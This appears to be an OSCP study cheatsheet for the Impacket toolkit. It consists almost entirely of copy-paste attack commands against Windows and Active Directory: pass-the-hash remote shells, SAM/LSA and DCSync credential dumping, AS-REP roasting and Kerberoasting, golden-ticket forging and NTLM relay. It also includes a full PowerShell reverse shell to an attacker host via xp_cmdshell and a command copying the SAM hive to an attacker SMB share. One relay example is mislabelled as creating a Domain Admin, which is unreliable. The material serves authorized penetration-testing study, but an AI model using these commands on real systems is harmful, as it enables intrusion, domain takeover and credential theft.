# Impacket - OSCP Cheatsheet

> **Methodology and Cheatsheet Cross-References**:
> - Active Directory Methodology: [[05-Active-Directory|05 - Active Directory Methodology]]
> - Windows Privilege Escalation: [[04-Windows-PrivEsc|04 - Windows Privilege Escalation]]
> - File Transfer Methodology: [[07-File-Transfer|07 - File Transfer Methodology]]
> - Active Directory Attacks Cheatsheet: [[⚔️ ad-attacks]]
> - Hashcat and John Cheatsheet: [[⛏️ hashcat-john]]

---

## Navigation Triage Matrix

| Operational Goal | Impacket Tool | Quick Link |
|---|---|---|
| Master connection syntax, PtH, and Kerberos flags | Global Syntax Rules | [[#1. Authentication and Global Flags]] |
| Obtain interactive shells or execute commands | Remote Execution Suite | [[#2. Remote Execution Suite (Shells and Commands)]] |
| Dump SAM, LSA secrets, or Domain Controller NTDS.dit | secretsdump | [[#3. Credential Dumping (impacket-secretsdump)]] |
| AS-REPRoasting without or with credentials | GetNPUsers | [[#4. Active Directory Attacks (AS-REP and Kerberoast)]] |
| Kerberoasting SPN service accounts | GetUserSPNs | [[#4. Active Directory Attacks (AS-REP and Kerberoast)]] |
| Enumerate users and groups via RID cycling | lookupsid | [[#5. Active Directory Enumeration (lookupsid and rpcdump)]] |
| Host SMB shares on Kali for file exfiltration | smbserver and smbclient | [[#6. SMB Operations (Shares and Client)]] |
| Interact with MSSQL, enable xp_cmdshell, harvest hashes | mssqlclient | [[#7. MSSQL Operations (impacket-mssqlclient)]] |
| Convert tickets, Overpass-the-Hash, forge Golden tickets | Kerberos Suite | [[#8. Kerberos Ticket Operations]] |
| Relay NTLM authentication to SMB, LDAP, or SOCKS | ntlmrelayx | [[#9. NTLM Relay Attacks (impacket-ntlmrelayx)]] |
| High-yield comparison table and copy-paste cheat block | Quick Reference | [[#10. Quick Reference Cheat Sheet]] |

---

## 1. Authentication and Global Flags

All Impacket tools adhere to a standardized target connection syntax and authentication flag structure:

### Target Specification Syntax
- **Domain Account**: `domain.local/username:password@[TARGET_IP]`
- **Local Account (No Domain)**: `username:password@[TARGET_IP]` or `./username:password@[TARGET_IP]`
- **Interactive Password Prompt**: `domain.local/username@[TARGET_IP]` (prompts on terminal)

### Universal Authentication Flags

| Flag | Purpose | Usage Example |
|---|---|---|
| `-hashes :[NT_HASH]` | Pass-the-Hash using NTLM hash | `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `-hashes [LM]:[NT]` | Full LM:NT hash pair (LM can be 32 zeros) | `-hashes 00000000000000000000000000000000:[NT_HASH]` |
| `-no-pass` | Connect without providing a password | `-no-pass` (often used with `-k` or guest) |
| `-k` | Use Kerberos authentication (requires KRB5CCNAME) | `-k -no-pass` |
| `-dc-ip [DC_IP]` | Explicitly route Kerberos/LDAP requests to DC | `-dc-ip 192.168.10.10` |
| `-target-ip [IP]` | Target IP override when using Kerberos FQDN | `-target-ip 192.168.10.20 dc01.corp.local` |

> ⚠️ **Kerberos Requirement**: Kerberos requires valid SPN resolution. When using `-k`, always specify the target as an FQDN (e.g., `dc01.corp.local`), ensure your Kali `/etc/hosts` resolves it to the target IP, and synchronize system clocks (`sudo ntpdate [DC_IP]`).

---

## 2. Remote Execution Suite (Shells and Commands)

### impacket-psexec
- **Mechanism**: Connects over SMB (port 445), uploads a randomly-named binary service executable to `ADMIN$`, creates and starts a Windows Service, routes I/O through named pipes, and deletes the binary upon exit.
- **Execution Context**: `NT AUTHORITY\SYSTEM`.
- **Characteristics**: Highly dependable; creates noisy Windows Event Logs (Event ID 7045 - Service Creation).

```bash
# Password authentication
impacket-psexec corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP]

# Pass-the-Hash
impacket-psexec -hashes :[NTLM_HASH] [USERNAME]@[TARGET_IP]

# Local Administrator Pass-the-Hash
impacket-psexec -hashes :[NTLM_HASH] Administrator@[TARGET_IP]

# Kerberos ticket authentication
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
```

### impacket-wmiexec
- **Mechanism**: Connects via WMI/DCOM (ports 135 and dynamic RPC), invokes `Win32_Process` to run commands, writes base64-encoded output to an SMB share (`ADMIN$`), reads the output, and removes the temporary file.
- **Execution Context**: Authenticated User context (non-SYSTEM unless connecting as Administrator).
- **Characteristics**: Stealthy semi-interactive shell; leaves no binary executable on the filesystem.

```bash
# Password authentication
impacket-wmiexec corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP]

# Pass-the-Hash
impacket-wmiexec -hashes :[NTLM_HASH] Administrator@[TARGET_IP]

# Execute single non-interactive command
impacket-wmiexec -hashes :[NTLM_HASH] Administrator@[TARGET_IP] "whoami /priv"
```

### impacket-smbexec
- **Mechanism**: Leverages native SMB calls to create a temporary service that redirects command output directly into an SMB batch file.
- **Execution Context**: `NT AUTHORITY\SYSTEM`.
- **Characteristics**: Fast; avoids uploading executable binary payloads to disk.

```bash
# Password authentication
impacket-smbexec corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP]

# Pass-the-Hash
impacket-smbexec -hashes :[NTLM_HASH] Administrator@[TARGET_IP]
```

### impacket-atexec
- **Mechanism**: Interacts with the Windows Task Scheduler service (`ITaskService` via RPC/DCOM), creates a scheduled task to run the command, grabs the output file, and tears down the task.
- **Execution Context**: `NT AUTHORITY\SYSTEM`.
- **Characteristics**: Single-command execution; ideal for rapid verification or reading sensitive files without spawning a full interactive session.

```bash
# Execute single command as SYSTEM
impacket-atexec corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP] 'whoami'

# Read proof flag via Pass-the-Hash
impacket-atexec -hashes :[NTLM_HASH] Administrator@[TARGET_IP] 'type C:\Users\Administrator\Desktop\proof.txt'
```

### impacket-dcomexec
- **Mechanism**: Uses DCOM objects (`MMC20.Application`, `ShellWindows`, or `ShellBrowserWindow`) to spawn processes on remote hosts.
- **Execution Context**: Authenticated User context.
- **Characteristics**: Bypasses environments where WMI or SMB process spawning is monitored or blocked.

```bash
# Execution via MMC20.Application object
impacket-dcomexec -object MMC20 corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP] "whoami"

# Pass-the-Hash execution via ShellWindows
impacket-dcomexec -object ShellWindows -hashes :[NTLM_HASH] Administrator@[TARGET_IP] "calc.exe"
```

---

## 3. Credential Dumping (impacket-secretsdump)

`impacket-secretsdump` is the premier tool for extracting password hashes and cached secrets from local registry hives or live domain controllers.

### Remote Machine Dumping (SAM, LSA Secrets)
Dumps local user NTLM hashes from the SAM hive and LSA secrets (machine passwords, service credentials):
```bash
# Password authentication
impacket-secretsdump corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP]

# Pass-the-Hash authentication
impacket-secretsdump -hashes :[NTLM_HASH] Administrator@[TARGET_IP]
```

### Domain Controller DCSync (NTDS.dit)
Executes a DCSync attack via the DRSUAPI protocol to simulate a replicating domain controller:
```bash
# Dump all domain hashes from Domain Controller
impacket-secretsdump corp.local/[ADMIN_USER]:'[PASSWORD]'@[DC_IP]

# Dump specific high-value target accounts only
impacket-secretsdump corp.local/[ADMIN_USER]:'[PASSWORD]'@[DC_IP] -just-dc-user Administrator
impacket-secretsdump corp.local/[ADMIN_USER]:'[PASSWORD]'@[DC_IP] -just-dc-user krbtgt

# DCSync via Pass-the-Hash
impacket-secretsdump corp.local/Administrator@[DC_IP] -hashes :[NTLM_HASH]

# DCSync via Kerberos ticket
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local
```

### Offline Local Registry Hive Parsing
When registry hives are recovered via volume shadow copies, backups, or raw exfiltration:
```bash
# Dump SAM hashes and LSA secrets from offline hives
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

# Dump offline NTDS.dit database
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

## 4. Active Directory Attacks (AS-REP and Kerberoast)

### impacket-GetNPUsers (AS-REPRoasting)
Targets domain user accounts with the attribute `DONT_REQ_PREAUTH` (Kerberos pre-authentication disabled):

```bash
# Unauthenticated roasting using a candidate username list
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip [DC_IP] -format hashcat -outputfile asrep.hashes

# Authenticated roasting (automatically enumerates all accounts in domain)
impacket-GetNPUsers corp.local/[USERNAME]:'[PASSWORD]' -dc-ip [DC_IP] -request -format hashcat -outputfile asrep.hashes

# Pass-the-Hash authentication
impacket-GetNPUsers corp.local/[USERNAME] -hashes :[NTLM_HASH] -dc-ip [DC_IP] -request -format hashcat
```
*Offline Cracking*: `hashcat -m 18200 -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt`

### impacket-GetUserSPNs (Kerberoasting)
Requests TGS service tickets for user accounts mapped to Service Principal Names (SPNs):

```bash
# Enumerate all Kerberoastable SPN accounts without requesting tickets
impacket-GetUserSPNs corp.local/[USERNAME]:'[PASSWORD]' -dc-ip [DC_IP]

# Request TGS tickets and output in Hashcat-ready format
impacket-GetUserSPNs corp.local/[USERNAME]:'[PASSWORD]' -dc-ip [DC_IP] -request -outputfile kerberoast.hashes

# Kerberoasting via Pass-the-Hash
impacket-GetUserSPNs corp.local/[USERNAME] -hashes :[NTLM_HASH] -dc-ip [DC_IP] -request -outputfile kerberoast.hashes

# Kerberoasting via Kerberos ticket
export KRB5CCNAME=user.ccache
impacket-GetUserSPNs -k -no-pass corp.local/[USERNAME] -dc-ip [DC_IP] -request -outputfile kerberoast.hashes
```
*Offline Cracking*: `hashcat -m 13100 -a 0 -O kerberoast.hashes /usr/share/wordlists/rockyou.txt`

---

## 5. Active Directory Enumeration (lookupsid and rpcdump)

### impacket-lookupsid (RID Cycling)
Brute-forces Security Identifiers (SIDs) through MSRPC to enumerate all active domain and local accounts, groups, and aliases:

```bash
# Authenticated RID cycling against Domain Controller
impacket-lookupsid corp.local/[USERNAME]:'[PASSWORD]'@[DC_IP]

# RID cycling using anonymous / guest session
impacket-lookupsid corp.local/guest@[DC_IP] -no-pass

# Extract discovered usernames directly into a clean list
impacket-lookupsid corp.local/[USERNAME]:'[PASSWORD]'@[DC_IP] | grep 'SidTypeUser' | awk '{print $2}' | cut -d'\\' -f2 > domain_users.txt
```

### impacket-rpcdump
Enumerates active MSRPC endpoints and interfaces registered with the RPC endpoint mapper:
```bash
# Scan target for exposed RPC endpoints (e.g., Print Spooler, MS-EFSR)
impacket-rpcdump [TARGET_IP]
impacket-rpcdump -port 135 [TARGET_IP]
```

### impacket-findDelegation
Queries LDAP to identify accounts configured with dangerous delegation settings:
```bash
impacket-findDelegation corp.local/[USERNAME]:'[PASSWORD]' -dc-ip [DC_IP]
```

---

## 6. SMB Operations (Shares and Client)

### impacket-smbserver (Hosting Files on Kali)
Spawns an SMB service on Kali to facilitate file transfers to and from Windows targets:

```bash
# Serve current working directory with SMB2/3 support (unauthenticated)
sudo impacket-smbserver share $(pwd) -smb2support

# Serve with authentication (required on modern hardened Windows systems)
sudo impacket-smbserver share $(pwd) -smb2support -username test -password pass
```

**Target Windows Interaction**:
```cmd
:: Download file from Kali SMB share
copy \\[KALI_IP]\share\nc.exe C:\Temp\nc.exe

:: Upload exfiltrated file to Kali SMB share
copy C:\Users\Administrator\Desktop\SAM \\[KALI_IP]\share\SAM

:: Mount share with credentials
net use Z: \\[KALI_IP]\share /user:test pass
```

### impacket-smbclient
Interactive SMB client that natively supports Pass-the-Hash and Kerberos:
```bash
# Connect with password
impacket-smbclient corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP]

# Connect with Pass-the-Hash
impacket-smbclient -hashes :[NTLM_HASH] Administrator@[TARGET_IP]

# In interactive shell:
# > shares           (list shares)
# > use C$           (switch share)
# > ls               (list directory contents)
# > get file.txt     (download file)
# > put file.exe     (upload file)
```

---

## 7. MSSQL Operations (impacket-mssqlclient)

Connect to Microsoft SQL Server instances, execute T-SQL queries, enable administrative extensions, and attain remote command execution:

### Connection Syntax
```bash
# Windows Integrated Authentication
impacket-mssqlclient corp.local/[USERNAME]:'[PASSWORD]'@[TARGET_IP] -windows-auth

# SQL Native Authentication (e.g., sa account)
impacket-mssqlclient sa:'[PASSWORD]'@[TARGET_IP]

# Pass-the-Hash Authentication
impacket-mssqlclient -hashes :[NTLM_HASH] [USERNAME]@[TARGET_IP] -windows-auth
```

### High-Yield MSSQL Exploitation Commands
Inside the interactive `SQL>` prompt:

```sql
-- 1. Check current database user and sysadmin role
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- 2. Enable advanced options and xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 3. Execute system command directly via xp_cmdshell
EXEC xp_cmdshell 'whoami /all';

-- 4. Spawn PowerShell reverse shell
EXEC xp_cmdshell 'powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(\"[KALI_IP]\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';

-- 5. Coerce NetNTLMv2 authentication to Responder (XP_DIRTREE)
EXEC master..xp_dirtree '\\[KALI_IP]\share', 1, 1;
```

---

## 8. Kerberos Ticket Operations

### impacket-ticketConverter
Convert between Linux/ccache ticket format and Windows/kirbi ticket format:
```bash
# Convert kirbi (from Rubeus or Mimikatz) to ccache (for Impacket)
impacket-ticketConverter ticket.kirbi ticket.ccache

# Convert ccache (from Impacket) to kirbi (for Windows tools)
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### Setting the Kerberos Cache Environment
```bash
export KRB5CCNAME=/absolute/path/to/ticket.ccache
```

### impacket-getTGT (Overpass-the-Hash)
Request a full Kerberos Ticket Granting Ticket (TGT) using an NTLM password hash:
```bash
impacket-getTGT corp.local/[USERNAME] -hashes :[NTLM_HASH] -dc-ip [DC_IP]
export KRB5CCNAME=[USERNAME].ccache
```

### impacket-ticketer (Golden and Silver Tickets)
Forge Kerberos tickets using recovered service keys:

```bash
# Forge Golden Ticket (requires domain SID and krbtgt NTLM hash)
impacket-ticketer -domain corp.local \
  -domain-sid S-1-5-21-3842939050-3880345419-1844481999 \
  -nthash [KRBTGT_HASH] \
  -groups 512,513,518,519,520 \
  Administrator

# Use forged Golden Ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
```

### impacket-getST (Constrained Delegation Abuse)
Request a service ticket impersonating a privileged user via S4U2self and S4U2proxy:
```bash
impacket-getST -spn 'cifs/target.corp.local' \
  -impersonate Administrator \
  -dc-ip [DC_IP] \
  corp.local/[SERVICE_ACCOUNT]:'[PASSWORD]'

export KRB5CCNAME=Administrator@cifs~target.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
```

---

## 9. NTLM Relay Attacks (impacket-ntlmrelayx)

Relay captured NetNTLM authentication (from Responder, PrintBug, or PetitPotam) to target network services:

```bash
# 1. Relay to SMB target with command execution
impacket-ntlmrelayx -t smb://[TARGET_IP] -smb2support -c "powershell -enc [BASE64_PAYLOAD]"

# 2. Relay to LDAP DC to create a new Domain Admin account
impacket-ntlmrelayx -t ldap://[DC_IP] -smb2support --add-computer 'ATTACK_PC$' --delegate-access

# 3. Relay to AD CS Web Enrollment (generate client certificate for PKINIT)
impacket-ntlmrelayx -t http://[CA_IP]/certsrv/certfnsh.asp -smb2support --template DomainController

# 4. Relay with SOCKS proxy support
impacket-ntlmrelayx -t smb://[TARGET_IP] -smb2support -socks
# View active relayed sessions via ntlmrelayx socks interface:
# Access sessions via proxychains: proxychains impacket-smbclient -no-pass [TARGET_IP]
```

---

## 10. Quick Reference Cheat Sheet

### Tool Execution Comparison Matrix

| Tool | Transport Protocol | Primary Port | Context | Binary on Disk? |
|---|---|---|---|---|
| `impacket-psexec` | SMB + Named Pipes | 445 | `SYSTEM` | Yes (random `.exe`) |
| `impacket-wmiexec` | WMI + DCOM + SMB | 135, 445, Dynamic | User Context | No (in-memory execution) |
| `impacket-smbexec` | SMB + Temporary Service | 445 | `SYSTEM` | No (`.bat` redirect) |
| `impacket-atexec` | Task Scheduler + RPC | 135, 445 | `SYSTEM` | No (scheduled task) |
| `impacket-dcomexec` | DCOM Objects | 135, Dynamic | User Context | No |
| `impacket-secretsdump` | DRSUAPI / MSRPC / SMB | 135, 445 | `SYSTEM` | No |
| `impacket-mssqlclient` | TDS (MSSQL) | 1433 | SQL Service Context | No |

### Essential Copy-Paste Command Block
```bash
# Quick Shell via PtH
impacket-wmiexec -hashes :[NTLM_HASH] Administrator@[TARGET_IP]

# Full SYSTEM Shell via PtH
impacket-psexec -hashes :[NTLM_HASH] Administrator@[TARGET_IP]

# Full DCSync
impacket-secretsdump corp.local/Administrator@[DC_IP] -hashes :[NTLM_HASH]

# Fast AS-REP Roasting
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip [DC_IP] -format hashcat

# Fast Kerberoasting
impacket-GetUserSPNs corp.local/[USER]:'[PASS]' -dc-ip [DC_IP] -request

# Host SMB Share on Kali
sudo impacket-smbserver share $(pwd) -smb2support
```
